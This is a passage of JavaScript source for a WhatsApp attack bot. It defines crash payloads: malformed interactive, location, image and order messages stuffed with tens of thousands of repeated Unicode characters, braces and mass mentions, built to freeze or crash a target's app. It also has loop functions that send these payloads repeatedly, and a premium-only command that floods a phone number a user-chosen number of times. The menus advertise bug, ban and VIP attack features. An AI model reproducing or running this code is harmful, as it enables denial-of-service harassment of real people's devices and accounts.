                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "cicitzy.100GB" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await ciciimup.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });
  await ciciimup.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });

  const CrashBload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "cicitzy.json", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "test onnn.....?",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
      mimetype: "audio/ogg; codecs=opus",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "9999999999",
      seconds: 999999,
      ptt: true,
      streamingSidecar: "꧔꧈".repeat(9999)
    }
  };
  await ciciimup.relayMessage(target, { message: CrashBload }, { messageId: callUiMsg.key.id });

  const blankContent = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "done......",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: { text: "A" },
          interactiveResponseMessage: {
            body: { text: "B", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "C",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "clyrinecici@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "vilesta. X9",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };
  const msgBlank = await generateWAMessageFromContent(target, blankContent, {});
  await ciciimup.relayMessage(target, msgBlank.message, { messageId: msgBlank.key.id });
}

async function UiCrash(target) {
  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "🌸 sigma girl attack ↯ UI crash 🎀",
          listType: 4,
          buttonText: { displayText: "🩷" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "cicitzy.35GB",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "🌸",
              body: "🎀",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
              extendedTextMessage: {
            text: "🌸 sigma girl attack ↯ ui crash 🎀" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "🌸 sigma girl attack ↯ ui crash 🎀" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
              },
            },
          },
        },
      },
    },
  }, {});
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Vilesta" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                },
              },
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(50000),
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Vilesta-ai.example.com",
                showAdAttribution: false
              },
            },
            body: { 
              text: "🌸 sigma girl attack ↯ UI crash 🎀" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
   );
   
  //RELAY MESSAGE 1
  await ciciimup.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  //RELAY MESSAGE 2
  await ciciimup.relayMessage(target, msg2.message, {
     participant: { jid: target },
     messageId: msg2.key.id,
   });
   console.log(chalk.red(`Succes Sending Bug CrashUi To ${target}`));
}

/* ============================================( FUNC NEW )==============
FUCNTION BUG 2026 CRAH UI SYSTEM ======================================================================*/

async function paramsloc(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🌸 sigma girl attack ↯ ui crash 🎀",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "cici.45GB",
                address: "cicitzy.978MB",
              },
            },
            body: {
              text: "vanitas",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 2000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await ciciimup.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function iosXnd(target) {
  let msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      contextInfo: {
        statusAttributionType: "RESHARED_FROM_POST"
      }, 
      text: "🧪⃟꙰。⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝  ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝  ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝🍷-( muzan sigma )-🍷 ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝  ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝  ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      matchedText: "t.me/axiombanner", 
      groupInviteLinkType: "DEFAULT"
    }
  }, {});
  
  await ciciimup.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid:target },
  });
}

async function imgCrash(target) {
    const contextInfo = {
        participant: target,
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "12345678",
        quotedMessage: {
            paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
                botName: "Meta AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "AI"
            }
        }
    };

 const Interactive = {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        contextInfo: {
        stanzaId: "cicitzy.980MB" + "X".repeat(10000),
          quotedMessage: {
            conversation: "@1".repeat(50000)
            }
            },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
               hasMediaAttachment: true, 
               imageMessage:  {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNJZ904M_qiioZ9g-HrV1w4lFOSS3VwLZLoSw6vZfPdCY0vcJhzFdyo29x5cpIYnhInyGNSyN4SzU2GfXDLKOP0a6FqvhLWPfc1w4RUHA?ccb=9-4&oh=01_Q5Aa2QHXYyf2IDC4YujDJnnrdJNsrkVs079iVwffCN0D37xaYA&oe=68E44309&_nc_sid=e6ed6c&mms3=true",
  mimetype: "image/jpeg",
  fileSha256: "H1InB8UDwh1hkaVZgWBHTGPdehdb0bsjmaMNGmdiSZY=",
  fileLength: "70847",
  height: 600,
  width: 735,
  mediaKey: "arfP38KVohuthL9dQTs2UQnCEi83h6yi/CUG8bLmBlU=",
  fileEncSha256: "uos8Lqlamv1x+m4AXb+6XuwyxLTa5hMhxkUmk9S49Yg=",
  directPath: "/o1/v/t24/f2/m234/AQNJZ904M_qiioZ9g-HrV1w4lFOSS3VwLZLoSw6vZfPdCY0vcJhzFdyo29x5cpIYnhInyGNSyN4SzU2GfXDLKOP0a6FqvhLWPfc1w4RUHA?ccb=9-4&oh=01_Q5Aa2QHXYyf2IDC4YujDJnnrdJNsrkVs079iVwffCN0D37xaYA&oe=68E44309&_nc_sid=e6ed6c",
  mediaKeyTimestamp: "1757207690",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADoASAMBIgACEQEDEQH/xAAwAAADAQEBAAAAAAAAAAAAAAACAwQAAQUBAAMBAQEAAAAAAAAAAAAAAAECAwAEBf/aAAwDAQACEAMQAAAAg73sPR6zrZASOVUePnlQU5mHQkszTM+FKapnzdU52hSwTnaNW0T1soLpVk86b3U0Hld9CbCnTaPaZqcYqBQWiymKsY0dwIYdrf/EACIQAAMAAgEEAwEBAAAAAAAAAAABAgMRIRIxMkEEInEQE//aAAgBAQABPwASEhSJGjgcoqRoSJkSOEtmZ20tPSN17bJy1PvaIc5FtfxIlHC7mTImnKTKb6ezOdjlLjp2Ym4yLXZmiUSZNaRTSkd/VojzQ2lyzHPVXVrSFLfomNmtMpqi252OmyU9E+SddhNaWiLc/hN7Ql1w9r8Hhcp7ZPxcb29+ivhyqXK0V8PbSVcFwp4MT5aIobpeLP8AW57Uy89XPkzHlyJ66mKrt7dMu6SS6mU2Q/siD0V7F3I8mSPzRkI8kf/EAB0RAQACAQUBAAAAAAAAAAAAAAEAAhEDEBIhMRP/2gAIAQIBAT8AWWtKjdnyTxnLHTLMDlYJWpUwRmoiwpVhphbMz3jEZwxPLbPuyT//xAAdEQEAAgIDAQEAAAAAAAAAAAABAAIDERAhMVFB/9oACAEDAQE/AIsbahlhYSWYsV+wJQdTJe3moW+x7/YTHYay5vg84xPTP//Z",
  contextInfo: {},
  scansSidecar: "ibEi8IzkrIY/GvOUtSZYriLmaBTF7yjOW5oZxYAlLwyBwtT0pZwqmQ==",
  scanLengths: [ 5304, 20279, 14410, 30854 ],
  midQualityFileSha256: "KbTNgF4VcUiQmPw5FNxA3qFpCFeNYq2hgjVttStYubQ="
    }
               },
              body: {
               text: "muzan sigma" 
               + "\n\n"
                + "ꦾ".repeat(5000)
                 },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(2000), 
                buttons: [
                  {
                    name: "payment_method",
                    buttonParamsJson: "{\"currency\":\"XXX\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"XxxXs\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"XxxXs\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"XxxXs\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                  },
                  {
                    name: "review_and_pay",
                    buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"X - XxXs\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"X - XxXs\",\"native_payment_methods\":[],\"share_payment_status\":true}"
                  }
                ]
              }
            }
          ]
        }
      }
    }
  }
};


    await ciciimup.relayMessage(target, Interactive, {
        messageId: "msg-" + Date.now(),
        userJid: target
    });
}

async function crashsystem(target) {
  await ciciimup.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          orderMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                "StatusAttributionType": 1,
                "forwardedAiBotMessageInfo": {
                  "botName": "Meta",
                  "botJid": "13135550002@s.whatsapp.net",
                  "creatorName": "🌸 sigma girl attack ↯  crash system 🎀"
                },
                "externalAdReply": {
                  "showAdAttribution": false,
                  "renderLargerThumbnail": true
                },
                "quotedMessage": {
                  "paymentInviteMessage": {
                    "serviceType": 1,
                    "expiryTimestamp": null
                  }
                },
                name: "address_message",
                paramsJson: {
                  values: {
                    building_name: "russian motel",
                    address: "2.7205",
                    tower_number: "507",
                    city: "— vilestá (¢)",
                    name: "🎀cicitzy.1GB",
                    phone_number: "+13135550202",
                    house_number: "7205826",
                    floor_number: "16",
                    state: `${"\x10".repeat(100000)}`,
                    in_pin_code: "7205",
                    orderId: "4U7S4RWPS3C",
                    itemCount: 999999999,
                    status: "DELIVERED",
                    surface: 2,
                    sellerJid: "x",
                    totalAmount1000: 60000000000,
                    currencyCodeIso4217: "IDR",
                    note: "ꦾ".repeat(50000),
                    subtotal: {
                      value: "999999999999",
                      offset: 1000
                    },
                    "StatusAttributionType": 1,
                    "forwardedAiBotMessageInfo": {
                      "botName": "Meta",
                      "botJid": "13135550002@s.whatsapp.net",
                      "creatorName": "cicitzy.1GB"
                    },
                    "externalAdReply": {
                      "showAdAttribution": false,
                      "renderLargerThumbnail": true
                    },
                    "quotedMessage": {
                      "paymentInviteMessage": {
                        "serviceType": 1,
                        "expiryTimestamp": null
                      }
                    },
                    thumbnailHeight: 480,
                    thumbnailWidth: 339,
                    caption: "ꦾ".repeat(150000)
                  }
                }
              }
            }
          }
        }
      }
    },
    {}
  );
}

/* ============================================= BATAS FUNC ===============================================*/

  async function cicitzy1(target) {
    for (let i = 0; i < 50; i++) {
      await uiKiller(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await uiKiller(target)
      // function new
      await vilestaFC(target)
      await DocFC(target)
      await PrePortDoc(target)
      await cicitzyFC1(target)
      await cicitzyFC2(target)
      await UiCallCrashBlank(target)
      await UiCrash(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
      // function new sleep
      await sleep(1000)
      await vilestaFC(target)
      await sleep(1000)
      await DocFC(target)
      await sleep(1000)
      await PrePortDoc(target)
      await sleep(1000)
      await cicitzyFC1(target)
      await sleep(1000)
      await cicitzyFC2(target)
      await sleep(1000)
      await UiCallCrashBlank(target)
      await sleep(1000)
      await UiCrash(target)
     }
    }
/* ========================================== COMBO FUNC1 ===============================================*/

  async function cicitzy2(target) {
    for (let i = 0; i < 50; i++) {
      await uiKiller(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await ForceClose2(target)
      await uiKiller(target)
      // function new
      await vilestaFC(target)
      await DocFC(target)
      await PrePortDoc(target)
      await cicitzyFC1(target)
      await cicitzyFC2(target)
      await UiCallCrashBlank(target)
      await UiCrash(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
      await ForceClose2(target)
      // funciton new sleep
      await vilestaFC(target)
      await sleep(1000)
      await DocFC(target)
      await sleep(1000)
      await PrePortDoc(target)
      await sleep(1000)
      await cicitzyFC1(target)
      await sleep(1000)
      await cicitzyFC2(target)
      await sleep(1000)
      await UiCallCrashBlank(target)
      await sleep(1000)
      await UiCrash(target)
      await ForceClose2(target)
     }
    }


  async function cicitzy3(target) {
    for (let i = 0; i < 50; i++) {
      await paramsloc(target)
      await iosXnd(target)
      await imgCrash(target)
      await crashsystem(target)
      // seelp func
      await sleep(1000)
      await paramsloc(target)
      await sleep(1000)
      await iosXnd(target)
      await sleep(1000)
      await imgCrash(target)
      await sleep(1000)
      await crashsystem(target)
    }
  }


/* ========================================== COMBO FUNC1 ===============================================*/

switch (command) {

case 'report2': case 'report1': {
  if (!isPremium) return ciciimupreply('</> premium access only </>')
  await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
  if (!q) return ciciimupreply(`Example: ${prefix + command} 62xxx|10 (the number at the end is the number of shipments)`)
  
  // Pisahkan nomor dan jumlah pengiriman menggunakan |
  const [nomorRaw, jumlahRaw] = q.split('|')
  if (!nomorRaw || !jumlahRaw) return ciciimupreply('Incorrect format! Use:  .report1 62xxx|10')
  
  // Validasi nomor dan jumlah
  const target = nomorRaw.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
  const jumlah = parseInt(jumlahRaw)
  if (isNaN(jumlah) || jumlah < 1 || jumlah > 99999999) { // Batas jumlah agar tidak berlebihan
    return ciciimupreply('The number must be a number between 1-1000!')
  }

  ciciimupreply(bugres)
  ciciimupreply(`*</> ⚠ warning ⚠️</>*

_please report the target 7×_
`) 
  
  // Loop sesuai jumlah yang diminta
  for (let i = 0; i < jumlah; i++) {
    await cicitzy1(target)
    await cicitzy2(target)
    // Tambah jeda kecil antar pengiriman agar tidak error (opsional tapi disarankan)
    await new Promise(resolve => setTimeout(resolve, 500))
  }

  ciciimupreply(`Suscesfully report to ${target}🐉 (total ${jumlah} times delivery)`)
  ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'menu':
case 'enu': {
  const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ sigma͢girl
> *➼ versão :* ↯ 1.0.0
> *➼ dev :* ↯ muzan sigma 
> *➼ geração :* ↯ legal

*🎀 att͢ack ↯ me͢nu 🎀*
> ➩ .bugmenu ↯ *—͢—*
> ➩ .banmenu ↯ *—͢—*
> ➩ .vipbug ↯ *—͢—*
> ➩ .funmenu ↯ *—͢—*

*🎀 ad͢d ↯ acc͢ess 🎀*
> ➩ .owner ↯ *—͢—*
> ➩ .add-acces ↯ *núm͢ero|30d*
> ➩ .del-acces ↯ *núm͢ero*

*desen͢volvedor de canal*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06
`;

  // Pastikan variabel 'fs' telah diimpor sebelumnya dengan 'const fs = require("fs")'
  let pesanFotoTeks = {
    image: fs.readFileSync('./cicitzy/cici-clyriné.jpg'), // Periksa path gambar benar
  };

  let buttons = [
    { buttonId: '.vipbug', buttonText: { displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀' }, type: 1 }
  ];

  // Hapus properti 'image: { url: image }' atau definisikan variabel 'image' terlebih dahulu
  // Jika ingin menggunakan gambar dari file lokal, gunakan pesanFotoTeks.image
  let buttonMessage = {
    image: pesanFotoTeks.image, // Gunakan gambar lokal yang sudah dibaca
    // gifPlayback: true, // Hapus atau aktifkan jika memang menggunakan GIF
    caption: teks,
    buttons: buttons,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363424304885587@newsletter",
        newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
      }
    },
    footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
    viewOnce: true,
    headerType: 6
  };

  // Hapus parameter 'pesanFotoTeks' karena sudah tercakup dalam 'buttonMessage'
  await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m });

  // Pastikan path file audio benar dan 'fs' telah diimpor
  await ciciimup.sendMessage(m.chat, { 
    audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), 
    mimetype: 'audio/mpeg', 
    ptt: false 
  }, { quoted: m });
}
break;

case 'funmenu': {
const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ vile͢stá
> *➼ versão :* ↯ 12.0.0
> *➼ dev :* ↯ cici clyr͢iné
> *➼ geração :* ↯ legal

*🎀 ran͢dom ↯ me͢nu 🎀*
> ➩ .hentai ↯ *—͢—*
> ➩ .love-you ↯ *—͢—*
> ➩ .rch ↯ *—͢—*
> ➩ .idch ↯ *—͢—*

*🎀 ad͢d ↯ acc͢ess 🎀*
> ➩ .owner ↯ *—͢—*
> ➩ .add-acces ↯ *núm͢ero|30d*
> ➩ .del-acces ↯ *núm͢ero*

*desen͢volvedor de canal*
https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06
`;

  // Pastikan variabel 'fs' telah diimpor sebelumnya dengan 'const fs = require("fs")'
  let pesanFotoTeks = {
    image: fs.readFileSync('./cicitzy/cici-clyriné.jpg'), // Periksa path gambar benar
  };

  let buttons = [
    { buttonId: '.vipbug', buttonText: { displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀' }, type: 1 }
  ];

  // Hapus properti 'image: { url: image }' atau definisikan variabel 'image' terlebih dahulu
  // Jika ingin menggunakan gambar dari file lokal, gunakan pesanFotoTeks.image
  let buttonMessage = {
    image: pesanFotoTeks.image, // Gunakan gambar lokal yang sudah dibaca
    // gifPlayback: true, // Hapus atau aktifkan jika memang menggunakan GIF
    caption: teks,
    buttons: buttons,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363424304885587@newsletter",
        newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
      }
    },
    footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
    viewOnce: true,
    headerType: 6
  };

  // Hapus parameter 'pesanFotoTeks' karena sudah tercakup dalam 'buttonMessage'
  await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m });

  // Pastikan path file audio benar dan 'fs' telah diimpor
  await ciciimup.sendMessage(m.chat, { 
    audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), 
    mimetype: 'audio/mpeg', 
    ptt: false 
  }, { quoted: m });
}
break;

case 'vipbug': {
ciciimupreply(`
*to get free vip bug access you must follow these terms warning ⚠*

1. join my telegram channel
https://t.me/axiome_7

2. join my whatsapp channel
